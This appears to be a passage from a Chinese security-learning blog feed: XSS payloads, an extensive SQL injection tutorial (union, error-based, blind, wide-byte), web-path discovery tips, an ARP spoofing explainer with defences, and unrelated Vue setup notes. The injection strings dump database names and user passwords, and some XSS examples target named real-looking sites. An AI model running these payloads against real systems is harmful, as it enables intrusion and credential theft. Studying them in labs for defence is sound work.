<p><code>/peixun/Search.asp?Field=&#39;&quot;&gt;&lt;iframe id=445 src=http://demo.testfire.net/phishing.html&gt;</code></p>
<p><code>&lt;script src=&quot;http://192.168.1.55:8080/xssing-master/?u=f389c3&quot; &gt; &lt;/script&gt; </code><br><code>&lt;script&gt;document.location=(&#39;http://www.baidu.com&#39;)&lt;/script&gt; </code><br><code>&lt;script&gt;document.write(&#39;&lt;iframe src=http://www.baidu.com  width=0 height=0&gt;&lt;/iframe&gt;&#39;);&lt;/script&gt; </code></p>
<p>/user/User_Message.asp?Action=Manage&amp;ManageType=Inbox&amp;Field=Content%22%3e%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%38%34%38%33%29%3c%2f%73%43%72%49%70%54%3e </p>
<p><code>&lt;input id=&quot;Submit&quot; type=&quot;submit&quot; value=&quot;保存修改结果&quot; onclick=&quot;alert(1)&quot;/&gt; &lt; name=&quot;Submit&quot;&gt;</code></p>
<p><a href="http://www.xx.com/netsearch_pre.jsp?netname=1&quot;">http://www.xx.com/netsearch_pre.jsp?netname=1&quot;</a> onmouseenter=”prompt(/csits/)</p>
<p>url=%0aX-XSS-Protection:%200%0a%0d%0a%0d&lt;img%20src=1%20onerror=alert(/xss/)&gt;</p>
<p><a href="http://edu.gf.com.cn/simulate?type=simulate_open&amp;category=%3Cimg%20src=@%20onmouseover=confirm(/xssme27/)%3E">http://edu.gf.com.cn/simulate?type=simulate_open&amp;category=%3Cimg%20src=@%20onmouseover=confirm(/xssme27/)%3E</a></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/2019/07/26/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="注入总结图"><a href="#注入总结图" class="headerlink" title="注入总结图"></a>注入总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.png"></p>
<h4 id="1-0-原理"><a href="#1-0-原理" class="headerlink" title="1.0 原理"></a>1.0 原理</h4><p>注入产生的原因是接受相关参数未经处理直接带入数据库查询操作</p>
<h4 id="1-1-攻击条件"><a href="#1-1-攻击条件" class="headerlink" title="1.1 攻击条件"></a>1.1 攻击条件</h4><ul>
<li><strong>确定Web应用程序所使用的技术</strong><ul>
<li>可以考察Web页面的页脚</li>
<li>查看错误页面</li>
<li>检查页面源代码</li>
<li>使用诸如Nessus、AWVS、APPSCAN等工具来进行刺探</li>
</ul>
</li>
<li><strong>确定所有可能的输入方式</strong><ul>
<li>HTML表单</li>
<li>通过隐藏的HTML表单输入、HTTP头部、cookies、甚至对用户不可见的后端AJAX请求来跟Web应用进行交互M</li>
<li>HTTP的GET和POST</li>
</ul>
</li>
<li><strong>查找可以用于注射的用户输入</strong><ul>
<li>多留意Web应用的错误页面</li>
</ul>
</li>
</ul>
<h4 id="1-2-注入前的准备及注入漏洞检测"><a href="#1-2-注入前的准备及注入漏洞检测" class="headerlink" title="1.2  注入前的准备及注入漏洞检测"></a>1.2  注入前的准备及注入漏洞检测</h4><ol>
<li><p>显示友好HTTP错误信息</p>
<ul>
<li>取消IE浏览器返回信息设置，以便查看到注入攻击时返回的数据库信息</li>
<li>打开IE浏览器，选择菜单“工具”一“Internet选项”命令，打开“Internet选项”对话框。打开“高级”选项卡，在“设置”列表框中找到“浏览组”，取消勾选“显示友好HTTP错误信息”</li>
</ul>
</li>
<li><p>手工检测sql注入点</p>
<ul>
<li><p>寻找如下形式的网页链接。（最常见）</p>
<p><a href="http://www.*****.com/***.asp?id=xx">http://www.*****.com/***.asp?id=xx</a> (ASP注入)</p>
<p><a href="http://www.*****.com/index.asp?id=8&amp;page=99">http://www.*****.com/index.asp?id=8&amp;page=99</a> </p>
<p>(注:注入的时候确认是id参数还是page参数，工具默认只对后面page参数注入，所以要对工具进行配置或者手工调换) </p>
</li>
<li><p>检测方法</p>
<ul>
<li><strong>“单引号”法</strong></li>
<li><strong>1=1和1=2法</strong></li>
</ul>
</li>
</ul>
</li>
</ol>
<h4 id="1-3-注入分类"><a href="#1-3-注入分类" class="headerlink" title="1.3  注入分类"></a>1.3  注入分类</h4><ol>
<li><p>数字型(or 1=1)</p>
<ul>
<li><p>通过burp抓包输入一个or 1=1设置一个payload,点击提交后，在Render中查看结果。通过判断存在SQL注入，且为数字型注入，可以通过拼接SQL语句来实现注入。</p>
<p><img src="/image/sql/sql-1.png"></p>
</li>
</ul>
</li>
<li><p>字符型(‘or 1=1#’)</p>
<ul>
<li><p>在vince后面添加单引号来闭合vince，再在1=1后面添加注释#来消除掉后面的单引号，这样来完成一个SQL语句的拼接合法性。完整的语句为select id,email from member where username=’vince‘ or 1=1#’；我们回到pikachu平台输入vince‘ or 1=1#</p>
<p><img src="/image/sql/sql-2.png"></p>
</li>
</ul>
</li>
<li><p>搜索型(%xxxx%’or 1=1 #%’)</p>
<ul>
<li><p>将拼接语句写为%xxxx%’or 1=1 #%’</p>
<p><img src="/image/sql/sql-3.png"></p>
</li>
</ul>
</li>
<li><p>xx型(XX’) or 1=1#)</p>
<ul>
<li><p>XX型是由于SQL语句拼接方式不同</p>
</li>
<li><p>拼接语句写为XX’) or 1=1#</p>
<p><img src="/image/sql/sql-4.png"></p>
</li>
</ul>
</li>
</ol>
<h4 id="1-4-注入提交方式"><a href="#1-4-注入提交方式" class="headerlink" title="1.4  注入提交方式"></a>1.4  注入提交方式</h4><p>ASP：request （全部接受）、request.querystring （接受get）、request.form （接受post）、 request.cookie cookie （接受cookie）</p>
<p>PHP:<code> $_REQUEST（全部接受）</code>、<code>$_GET $_POST （接受post）</code>、<code>$_COOKIE（接受cookie）</code></p>
<h4 id="1-5-注入攻击类型与方式"><a href="#1-5-注入攻击类型与方式" class="headerlink" title="1.5   注入攻击类型与方式"></a>1.5   <strong>注入攻击类型与方式</strong></h4><ul>
<li><p>union注入</p>
<ul>
<li><p>union操作符用于合并两个或多个SQL语句集合起来，得到联合的查询结果</p>
<p><strong>select id,email from member where username=’kevin’ union select username,pw from member where id=1;</strong></p>
<p><strong>注：union操作符一般与order by语句配合使用</strong></p>
<ul>
<li><p>输入a’ order by 3#% ，通过这个简单的办法找到主查询一共有三个字段</p>
<p><img src="/image/sql/sql-5.png"></p>
</li>
<li><p>之后我们来使用union来做一个SQL语句的拼接。输入构造好的语句a’ union select database(),user(),version()#%</p>
<p><img src="/image/sql/sql-6.png"></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>information_schema注入</p>
<ul>
<li>information_schema数据库是MySQL系统自带的数据库</li>
<li>通过information_schema注入，我们可以将整个数据库内容全部窃取出来, <ul>
<li>使用order by来判断查询的字段</li>
<li>找出数据库的名称，输入vince’ union select database(),user(),3#%</li>
<li>获取pikachu数据库的<strong>表名</strong>，输入:u’ union select table_schema ,table_name,3 from information_schema.tables where table_schema=’pikachu’#</li>
<li>获取pikachu数据库的<strong>字段名</strong>，输入： k’ union select table_name,column_name,3 from information_schema.columns where table_name=’users’#%</li>
<li>最后获取<strong>字段值</strong>的内容，输入：kobe’union select username ,password,3 from users#%</li>
</ul>
</li>
</ul>
</li>
<li><p>基于函数的报错</p>
<ul>
<li><p>条件：后台没有屏蔽数据库报错信息,在语法发生错误时会输出在前端</p>
</li>
<li><p><strong>三个常用的用来报错的函数</strong></p>
<ul>
<li><p>updatexml（）:函数是MYSQL对XML文档数据进行查询和修改的XPATH函数.</p>
<p>1、爆数据库版本信息</p>
<p>k’ and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) #</p>
<p>2、爆数据库当前用户</p>
<p>k’ and  updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)#  </p>
<p>3、爆数据库</p>
<p>k’ and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #</p>
<p>4、爆表</p>
<p>获取数据库表名，输入：k’and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’)),0)#，但是反馈回的错误表示只能显示一行，所以采用limit来一行一行显示</p>
<p>输入k’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’limit 0,1)),0)#更改limit后面的数字limit 0完成表名遍历。</p>
<p>5、爆字段</p>
<p>获取字段名，输入：k’ and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’limit <strong>2</strong>,1)),0)#</p>
<p>6、爆字段内容</p>
<p>获取字段内容，输入：k’ and  updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#</p>
</li>
<li><p>extractvalue（） :函数也是MYSQL对XML文档数据进行查询的XPATH函数.</p>
</li>
<li><p>floor（）:MYSQL中用来取整的函数.</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>insert注入</p>
<ul>
<li><p>前端注册的信息最终会被后台通过insert这个操作插入数据库，后台在接受前端的注册数据时没有做防SQL注入的处理</p>
</li>
<li><p>进入网站注册页面，填写网站注册相关信息，通过Burp抓包在用户名输入相关payload</p>
<p>oldboy’or updatexml(1,concat(0x7e,(命令)),0) or’</p>
<p>\1. 爆表名</p>
<p>oldboy’or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1)),0) or’</p>
<p><img src="/image/sql/wps1.jpg" alt="img"> </p>
<p>\2. 爆列名</p>
<p>‘ or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’users’limit 2,1)),0) or’</p>
<p><img src="/image/sql/wps2.jpg" alt="img"> </p>
<p>\3. 爆内容</p>
<p>‘ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or’ 等同</p>
<p>‘ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or ‘1’=’1’’</p>
</li>
</ul>
</li>
<li><p>uodate注入</p>
<ul>
<li><p>与insert注入的方法大体相同，区别在于update用于用户登陆端，insert用于用于用户注册端</p>
<p>‘ or updatexml(0,concat(0x7e,(database())),0) or’</p>
</li>
</ul>
</li>
<li><p>dalete注入</p>
<ul>
<li><p>一般应用于前后端发贴、留言、用户等相关删除操作，点击删除按钮时可通过Brup Suite抓包，对数据包相关delete参数进行注入</p>
<p>delete from message where id=56 or updatexml(2,concat(0x7e,(database())),0)</p>
</li>
</ul>
</li>
<li><p>http header注入</p>
<ul>
<li>User-Agent输入payload Mozilla’ or updatexml(1,concat(0x7e,database ()),0) or ‘html&gt;</li>
</ul>
</li>
<li><p>cookie注入</p>
<ul>
<li>如果后端获取Cookie后放在数据库中进行拼接，那么这也将是一个SQL注入点</li>
<li>在 ant[uname]=admin后添加一个’观察反馈的MYSQL的语法报错，发现了存在SQL注入漏洞，在设置Payload ‘and updatexml (1,concat(0x7e,database()),0)#,观察报错和之前是否相同</li>
</ul>
</li>
<li><p>盲注(base on boolian)、盲注(base on time)</p>
<ul>
<li><p>布尔盲注</p>
<ul>
<li><p>在SQL注入过程中，SQL语句执行选择后，选择的数据不能回显到前端，我们需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。</p>
<p>输入语句select ascii(substr(database(),1,1))&gt;xx;通过对比ascii码的长度，判断出数据库表名的第一个字符。</p>
<p><strong>注: substr()函数</strong></p>
<p>string(必需)规定要返回其中一部分的字符串。start(必需)规定在字符串的何处开始。length(可选)规定被返回字符串的长度。</p>
</li>
<li><p>在实际操作中通常不会使用手动盲注的办法，可以使用sqlmap等工具来增加盲注的效率。</p>
</li>
</ul>
</li>
<li><p>时间盲注</p>
<ul>
<li><p>payload: vince’ and sleep(x)#</p>
</li>
<li><p>vince’ and if(substr(database(),1,1)=’X’ (猜测点)’,sleep(10),null#</p>
<p>输入后，如果猜测真确，那么就会响应10秒，如果错误会立刻返回错误。</p>
</li>
<li><p>输入：vince’ and if(substr(database(),1,1)=’p’,sleep(10),null)#</p>
<p>在web控制台下，判断出database的表名的一个字符为p</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>宽字节注入</p>
<ul>
<li><p>当我们把php.ini文件里面的magic_quotes_gqc参数设为ON时，所有的’（单引号），”(双引号)，(反斜杠)和null字符都会被自动加上一个反斜杠进行转义。还有很多函数有类似的作用如：addslashes()、mysql_escape_string()、mysql_real_escape_string()等，另外还有parse_str()后的变量也受magic_quotes_gpc的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全，很多漏洞查找者或者工具遇到这些函数过滤后的变量直接就放弃，但是就在他们放弃的同时也放过很多致命的安全漏洞。</p>
<p>其中\的十六进制是 %5C ，当我们在单引号前面加上%df的时候，最终就会变成 運’，如果程序的默认字符集是GBK等宽字节字符集，则MYSQL用GBK的编码时，会认为 %df 是一个宽字符，也就是運，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</p>
<p>‘ =======&gt;&#39;单引号转义后占两个字节，所以我们需要通过繁体字%df构造两个字节,最终用運干掉了\，也就是说被運占领了\ 所以最后在页面也不会显示出来.</p>
</li>
<li><p><strong>哪些地方没有魔术引号的保护？</strong></p>
<p>（1） $_SERVER 变量</p>
<p>  PHP5的$_SERVER变量缺少magic_quotes_gqc的保护，导致近年来X-Forwarded-For的漏洞猛爆，所以很多程序员考虑过滤X-Forwarded-For，但是其它的变量呢？</p>
<p>（2）getenv()得到的变量（使用类似$_SERVER 变量）</p>
<p>（3）$HTTP_RAW_POST_DATA与PHP输入、输出流</p>
</li>
</ul>
</li>
</ul>
<ol>
<li><p>内置变量爆数据库类型</p>
<p>“User”是SQL Server的一个内置变量，它的值是当前连接的用户名，其变量类型为“nvarchar”字符型</p>
<p>方法：在注入点之后提交   and user&gt;0</p>
<p>错误信息：</p>
<p>​    Microsoft OLE DB Provider for SQL Server 错误’80040e21’（MS SQL数据库）</p>
<p>​    将nvarchar值’’转换为数据类型为int的列时发生语法错误。（Access数据库）</p>
</li>
</ol>
<h4 id="1-6实战"><a href="#1-6实战" class="headerlink" title="1.6实战"></a>1.6实战</h4><p> access 数据库<a href="https://www.jianshu.com/p/fc1e26d3ad45">https://www.jianshu.com/p/fc1e26d3ad45</a></p>
<p>mysql 数据库<a href="https://www.jianshu.com/p/f98ab1b4b12e">https://www.jianshu.com/p/f98ab1b4b12e</a></p>
<h4 id="1-7获取Web路径"><a href="#1-7获取Web路径" class="headerlink" title="1.7获取Web路径"></a>1.7<strong>获取Web路径</strong></h4><p>(1)一般可以在变量后面加上单引号、改变参数类型、增加参数位数等来造成MySQL数据库出错，爆出Web物理路径。</p>
<p>（2）通过扫描器扫web服务器遗留文件 php.php、info.php、phpinfo.php、test.php</p>
<p>（3）利用搜索引擎来查找Web目录。搜索引擎有时候会对网站页面进行快照抓取，包括脚本出错页面，因此可利用搜索引擎查找网站的出错信息，从而获得网站的物理路径。可在Google或百度中搜索“mysql site:<strong><em>.com”或“warning site:</em></strong>.com,error site:***.com.cn”等。</p>
<p>这里使用“error site:***.com”关键字进行查询，从搜索结果中得到了网站的物理路径为“E:\pujing2015”。</p>
<p>(4) 漏洞暴路径，例如通过网站后台查看网站Web路径、CC攻击暴路径等.</p>
<p>(6)通过配置文件找网站路径,在百度里面输入***配置文件,如:IIS6.0配置文件，可以找到: C:\WINDOWS\system32\inetsrv\MetaBase.xml 和C:\WINDOWS\system32\inetsrv\MetaBase.bin 这两个配置文件（小技巧:在百度里面输入:load_file()常用敏感信息，就可以找到别人入侵过程中总结的常用敏感文件路径）。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>vue搭建</title>
    <url>/2020/09/15/vue%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h4 id="1-避坑前言"><a href="#1-避坑前言" class="headerlink" title="1. 避坑前言"></a>1. 避坑前言</h4><p>确认node与npm的版本</p>
<p>将这个放在最前面说是希望大家在搭建前，应该先确保将node更新至6以上，这样能少走一些弯路。下面开始正式介绍整个构建过程。</p>
<h4 id="2-使用-vue-cli-搭建项目"><a href="#2-使用-vue-cli-搭建项目" class="headerlink" title="2. 使用 vue-cli 搭建项目"></a>2. 使用 vue-cli 搭建项目</h4><p>下面整个过程是基于已经安装node.js和cnpm的基础上，node.js如何安装就不在这里详说了。如何全局化安装cnpm，这里简单提一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install cnpm -g --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure>

<p>其实对于安装vue-cli，使用npm命令和cnpm命令都是可以的，个人觉得使用npm安装的比较慢，而且很可能会因为网络问题而出错，所以还是觉得使用cnpm稳一点。</p>
<h6 id="（1）全局安装-vue-cli-，在命令提示窗口执行："><a href="#（1）全局安装-vue-cli-，在命令提示窗口执行：" class="headerlink" title="（1）全局安装 vue-cli ，在命令提示窗口执行："></a>（1）全局安装 vue-cli ，在命令提示窗口执行：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install -g vue-cli </span><br></pre></td></tr></table></figure>

<p>安装vue-cli</p>
<p>出现以上提示表示vue-cli正常安装成功，可以正式创建vue-cli工程项目了。</p>
<h6 id="（2）安装vue-cli成功后，通过cd命令进入你想放置项目的文件夹，在命令提示窗口执行创建vue-cli工程项目的命令："><a href="#（2）安装vue-cli成功后，通过cd命令进入你想放置项目的文件夹，在命令提示窗口执行创建vue-cli工程项目的命令：" class="headerlink" title="（2）安装vue-cli成功后，通过cd命令进入你想放置项目的文件夹，在命令提示窗口执行创建vue-cli工程项目的命令："></a>（2）安装vue-cli成功后，通过cd命令进入你想放置项目的文件夹，在命令提示窗口执行创建vue-cli工程项目的命令：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vue init webpack</span><br></pre></td></tr></table></figure>

<p>创建vue-cli工程项目</p>
<p>确认创建项目后，后续还需输入一下项目名称、项目描述、作者、打包方式、是否使用ESLint规范代码等等，</p>
<p>生成文件目录</p>
<h6 id="（3）生成文件目录后，使用-cnpm-安装依赖："><a href="#（3）生成文件目录后，使用-cnpm-安装依赖：" class="headerlink" title="（3）生成文件目录后，使用 cnpm 安装依赖："></a>（3）生成文件目录后，使用 cnpm 安装依赖：</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install </span><br></pre></td></tr></table></figure>

<p>安装依赖</p>
<h6 id="（4）最后需要执行命令：-npm-run-dev-来启动项目，启动完成后会自动弹出默认网页："><a href="#（4）最后需要执行命令：-npm-run-dev-来启动项目，启动完成后会自动弹出默认网页：" class="headerlink" title="（4）最后需要执行命令： npm run dev  来启动项目，启动完成后会自动弹出默认网页："></a>（4）最后需要执行命令： npm run dev  来启动项目，启动完成后会自动弹出默认网页：</h6><p>到这一步，就算成功利用vue-cli搭建一个vue项目了，撒花 ~</p>
<h4 id="3-目录结构及其对应作用"><a href="#3-目录结构及其对应作用" class="headerlink" title="3.目录结构及其对应作用"></a>3.目录结构及其对应作用</h4><p>通过vue-cli搭建一个vue项目，会自动生成一系列文件，而这些文件具体是怎样的结构、文件对应起什么作用，可以看看下面的解释：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">├── build&#x2F;                      # webpack 编译任务配置文件: 开发环境与生产环境</span><br><span class="line">│   └── ...</span><br><span class="line">├── config&#x2F;                     </span><br><span class="line">│   ├── index.js                # 项目核心配置</span><br><span class="line">│   └── ...</span><br><span class="line">├ ── node_module&#x2F;               #项目中安装的依赖模块</span><br><span class="line">   ── src&#x2F;</span><br><span class="line">│   ├── main.js                 # 程序入口文件</span><br><span class="line">│   ├── App.vue                 # 程序入口vue组件</span><br><span class="line">│   ├── components&#x2F;             # 组件</span><br><span class="line">│   │   └── ...</span><br><span class="line">│   └── assets&#x2F;                 # 资源文件夹，一般放一些静态资源文件</span><br><span class="line">│       └── ...</span><br><span class="line">├── static&#x2F;                     # 纯静态资源 (直接拷贝到dist&#x2F;static&#x2F;里面)</span><br><span class="line">├── test&#x2F;</span><br><span class="line">│   └── unit&#x2F;                   # 单元测试</span><br><span class="line">│   │   ├── specs&#x2F;              # 测试规范</span><br><span class="line">│   │   ├── index.js            # 测试入口文件</span><br><span class="line">│   │   └── karma.conf.js       # 测试运行配置文件</span><br><span class="line">│   └── e2e&#x2F;                    # 端到端测试</span><br><span class="line">│   │   ├── specs&#x2F;              # 测试规范</span><br><span class="line">│   │   ├── custom-assertions&#x2F;  # 端到端测试自定义断言</span><br><span class="line">│   │   ├── runner.js           # 运行测试的脚本</span><br><span class="line">│   │   └── nightwatch.conf.js  # 运行测试的配置文件</span><br><span class="line">├── .babelrc                    # babel 配置文件</span><br><span class="line">├── .editorconfig               # 编辑配置文件</span><br><span class="line">├── .gitignore                  # 用来过滤一些版本控制的文件，比如node_modules文件夹 </span><br><span class="line">├── index.html                  # index.html 入口模板文件</span><br><span class="line">└── package.json                # 项目文件，记载着一些命令和依赖还有简要的项目描述信息 </span><br><span class="line">└── README.md                   #介绍自己这个项目的，可参照github上star多的项目。</span><br><span class="line">build&#x2F;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE</title>
    <url>/2019/08/01/XXE/</url>
    <content><![CDATA[<h2 id="总结图"><a href="#总结图" class="headerlink" title=" 总结图"></a> 总结图</h2><p><img src="/image/xee/1.jpg"></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>中间人攻击</title>
    <url>/2020/09/22/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="什么是ARP协议"><a href="#什么是ARP协议" class="headerlink" title="什么是ARP协议"></a>什么是ARP协议</h1><blockquote>
<p>ARP（Address Resolution Protocol）地址解析协议，目的是实现IP地址到MAC地址的转换。<br>在计算机间通信的时候，计算机要知道目的计算机是谁（就像我们人交流一样，要知道对方是谁），这中间需要涉及到MAC地址，而MAC是真正的电脑的唯一标识符。<br>为什么需要ARP协议呢？因为在OSI七层模型中，对数据从上到下进行封装发送出去，然后对数据从下到上解包接收，但是上层（网络层）关心的IP地址，下层关心的是MAC地址，这个时候就需要映射IP和MAC。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ARP命令常见用法：</span><br><span class="line">1、arp -s Ip 物理地址</span><br><span class="line"></span><br><span class="line">可以向ARp高速缓存中人工输入一个静态项目。该项目在计算机引导过程中将保持有效状态，或者在出现错误时，人工配置的物理地址将自动更新该项目。</span><br><span class="line"></span><br><span class="line">2、arp -a或arp –g</span><br><span class="line"></span><br><span class="line">用于查看高速缓存中的所有项目。-a和-g参数的结果是一样的，多年来-g一直是UNIX平台上用来显示ARp高速缓存中所有项目的选项，而Windows用的是arp -a（-a可被视为all，即全部的意思），但它也可以接受比较传统的-g选项。</span><br><span class="line"></span><br><span class="line">3、arp -d Ip</span><br><span class="line">使用该命令能够人工删除一个静态项目。</span><br></pre></td></tr></table></figure>

<h1 id="ARP欺骗的危害"><a href="#ARP欺骗的危害" class="headerlink" title="ARP欺骗的危害"></a>ARP欺骗的危害</h1><blockquote>
<p>ARP欺骗可以造成内部网络的混乱，让某些被欺骗的计算机无法正常访问内外网，让网关无法和客户端正常通信，也可以截取全网络数据包等。实际上他的危害还不仅仅如此，一般来说IP地址的冲突我们可以通过多种方法和手段来避免，而ARP协议工作在更低层，隐蔽性更高。系统并不会判断ARP缓存的正确与否，无法像IP地址冲突那样给出提示。</p>
</blockquote>
<h1 id="ARP欺骗原理也叫中间人欺骗"><a href="#ARP欺骗原理也叫中间人欺骗" class="headerlink" title="ARP欺骗原理也叫中间人欺骗"></a>ARP欺骗原理也叫中间人欺骗</h1><blockquote>
<p>设爱丽丝（Alice）希望与鲍伯（Bob）通信。同时，马洛里（Mallory）希望拦截窃会话以进行窃听并可能在某些时候传送给鲍伯一个虚假的消息。<br>首先，爱丽丝会向鲍勃索取他的公钥。如果Bob将他的公钥发送给Alice，并且此时马洛里能够拦截到这个公钥，就可以实施中间人攻击。马洛里发送给爱丽丝一个伪造的消息，声称自己是鲍伯，并且附上了马洛里自己的公钥（而不是鲍伯的）。<br>爱丽丝收到公钥后相信这个公钥是鲍伯的，于是爱丽丝将她的消息用马洛里的公钥（爱丽丝以为是鲍伯的）加密，并将加密后的消息回给鲍伯。马洛里再次截获爱丽丝回给鲍伯的消息，并使用马洛里自己的私钥对消息进行解密，如果马洛里愿意，她也可以对消息进行修改，然后马洛里使用鲍伯原先发给爱丽丝的公钥对消息再次加密。当鲍伯收到新加密后的消息时，他会相信这是从爱丽丝那里发来的消息。<br>我们的身份就是Mallory，我们希望欺骗Alice和Bob，让其认为我们是交互的正确目标，从而来获取他们之间交流的信息</p>
</blockquote>
<p><img src="/image/arp.jpg"></p>
<h1 id="ARP安全防范"><a href="#ARP安全防范" class="headerlink" title="ARP安全防范"></a>ARP安全防范</h1><p>1、不要随意登录免费的WIFI，没人知道免费的WIFI是不是有恶意的攻击者在搞鬼；</p>
<p>2:使用ARP绑定， 避免被ARP欺骗；</p>
<p>3:开启电脑管家或者360安全卫士的ARP防火墙或金山贝壳或彩影ARP防火墙；</p>
<p>4:使用https协议或者其他有保密协议的连接访问外网，避免被坑。<br>5、手工静态绑定<br>编写一个批处理文件命名为xx.bat，将批处理文件放到“Windows→开始→程序→启动”中，如果需要立即生效，请运行此文件。批处理文件内容如下：<br>@echo off<br>arp －d<br>arp -s 192.168.0.115 00-16-36-f7-bd-5e  //ip与MAC地址根据具体情况修改。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>waf绕过</title>
    <url>/2020/05/09/waf%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/waf%E7%BB%95%E8%BF%87.png"></p>
<p>安装介绍<a href="https://www.jstxk.com/article/12.html">https://www.jstxk.com/article/12.html</a></p>
<p>经过一番搜索，终于找到了解决方法，作下记录：这里先把Apache关掉，然后打开命令行工具，切换到apache安装目录下的bin文件夹，执行以下命令</p>
<blockquote>
<p>httpd.exe -k install -n apache2.0</p>
<p>如果要删除服务重新来，可以输下面这个，给你留着备用</p>
<p>sc delete apache2.0</p>
<p>然后就会出现安装成功的提示，再进行安全狗的配置</p>
</blockquote>
<h2 id="🎃WAF简介"><a href="#🎃WAF简介" class="headerlink" title="🎃WAF简介"></a>🎃WAF简介</h2><blockquote>
<p>1、网站WAF是一款集网站内容安全防护、网站资源保护及网站流量保护功能为一体的服务器工具。功能涵盖了网马/木马扫描、防SQL注入、防盗链、防CC攻击、网站流量实时监控、网站CPU监控、下载线程保护、IP黑白名单管理、网页防篡改功能等模块。能够为用户提供实时的网站安全防护，避免各类针对网站的攻击所带来的危害。 </p>
<p> 2、网站WAF是一款服务器安全防护软件，是为IDC运营商、虚拟主机服务商、企业主机、服务器管理者等用户提供服务器安全防范的实用系统，是集网站内容安全防护、网站资源保护及网站流量保护功能为一体的服务器工具。</p>
<p>3、常见的<a href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/2384478.htm">系统攻击</a>分为两类：一是利用Web服务器的<a href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/93544.htm">漏洞</a>进行攻击，如<a href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/5522.htm">DDOS攻击</a>、病毒<a href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/931.htm">木马</a>破坏等攻击；二是利用网页自身的<a href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/160026.htm">安全漏洞</a>进行攻击，如<a href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/983303.htm">SQL注入攻击</a>、<a href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/2633667.htm">跨站脚本攻击</a>等。常见攻击方式对网站服务器带来的危害主要集中在病毒<a href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/931.htm">木马</a>破坏、网页非法篡改、各类<a href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/133739.htm">网络攻击</a>带来的威胁。</p>
</blockquote>
<h2 id="🎐WAF主要功能"><a href="#🎐WAF主要功能" class="headerlink" title="🎐WAF主要功能"></a>🎐WAF主要功能</h2><p><strong>网马木马主动防御及查杀</strong></p>
<blockquote>
<p>　　<a href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/379675.htm">网页木马</a>和<a href="https://links.jianshu.com/go?to=http://baike.baidu.com/view/131253.htm">网页挂马</a>扫描工具采用特征码+启发式引擎的查杀算法，WEB木马检出率大于90%</p>
</blockquote>
<hr>
<p><strong>流量监控</strong></p>
<blockquote>
<p>能够实时监测到每个网站的进出流量和总流量，以及每个应用程序池及网站的CPU占用情况</p>
</blockquote>
<hr>
<p><strong>网站漏洞防御功能</strong></p>
<blockquote>
<p>可拦截GET、POST、<a href="https://links.jianshu.com/go?to=http://baike.baidu.com/subview/1311/6319629.htm">COOKIES</a>等方式的SQL注入，可对GET、POST、COOKIES分别定义特征码，以及可拦截XSS注入等行为。</p>
</blockquote>
<hr>
<p><strong>危险组件防护功能</strong></p>
<blockquote>
<p>全面拦截恶意代码对组件的调用权限，拦截IIS执行恶意程序，保护网站安全</p>
</blockquote>
<p><strong>.Net**</strong>安全保护模块**　</p>
<blockquote>
